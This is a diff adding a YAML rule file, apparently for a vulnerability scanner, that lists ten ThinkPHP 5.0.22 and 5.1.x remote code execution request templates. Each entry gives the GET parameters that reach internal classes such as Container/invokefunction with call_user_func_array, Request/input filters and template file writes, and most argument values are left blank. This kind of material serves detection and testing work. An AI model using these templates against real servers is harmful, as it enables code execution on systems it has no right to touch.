@@ -1,0 +1,114 @@
+models:
+  - ThinkPHP:
+    info: "ThinkPHP 5.0.22 RCE"
+    cveid: ""
+    reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce"
+    method: "GET"
+    status: true
+    url: "/"
+    keys:
+      s: "index/think\\app/invokefunction"
+      function: ""
+
+  - ThinkPHP2:
+    info: "ThinkPHP 5.0.22 RCE 2"
+    cveid: ""
+    reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce"
+    method: "GET"
+    status: true
+    url: "/"
+    keys:
+      s: "index\\think\\Request/input"
+      filter: ""
+      data: ""
+
+  - ThinkPHP3:
+    info: "ThinkPHP 5.0.22 RCE"
+    cveid: ""
+    reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce"
+    method: "GET"
+    status: true
+    url: "/"
+    keys:
+      s: "index/\\think\\template\\driver\\file/write"
+      cacheFile: ""
+      content: ""
+
+  - ThinkPHP4:
+    info: "ThinkPHP 5.0.22 RCE"
+    cveid: ""
+    reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce"
+    method: "GET"
+    status: true
+    url: "/"
+    keys:
+      s: "index/\\think\\Lang/load"
+      file: ""
+
+  - ThinkPHP5:
+    info: "ThinkPHP 5.0.22 RCE"
+    cveid: ""
+    reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce"
+    method: "GET"
+    status: true
+    url: "/"
+    keys:
+      s: "index/\\think\\Config/load"
+      file: ""
+
+  - ThinkPHP6:
+    info: "ThinkPHP 5.0.22 RCE"
+    cveid: ""
+    reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce"
+    method: "GET"
+    status: true
+    url: "/"
+    keys:
+      s: "index/think\\config/get"
+      file: ""
+
+  - ThinkPHP7:
+    info: "ThinkPHP 5.1.x RCE"
+    cveid: ""
+    reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce"
+    method: "GET"
+    status: true
+    url: "/"
+    keys:
+      s: "index/\\think\\Container/invokefunction"
+      function: "call_user_func_array"
+
+  - ThinkPHP8:
+    info: "ThinkPHP 5.1.x RCE"
+    cveid: ""
+    reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce"
+    method: "GET"
+    status: true
+    url: "/"
+    keys:
+      s: "index/\\think\\template\\driver\\file/write"
+      cacheFile: ""
+      content: ""
+
+  - ThinkPHP9:
+    info: "ThinkPHP 5.1.x RCE"
+    cveid: ""
+    reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce"
+    method: "GET"
+    status: true
+    url: "/"
+    keys:
+      s: "index/\\think\\view\\driver\\Php/display"
+      content: ""
+
+  - ThinkPHP10:
+    info: "ThinkPHP 5.1.x RCE"
+    cveid: ""
+    reference: "https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce"
+    method: "GET"
+    status: true
+    url: "/"
+    keys:
+      s: "index/\\think\\Request/input"
+      filter[]: ""
+
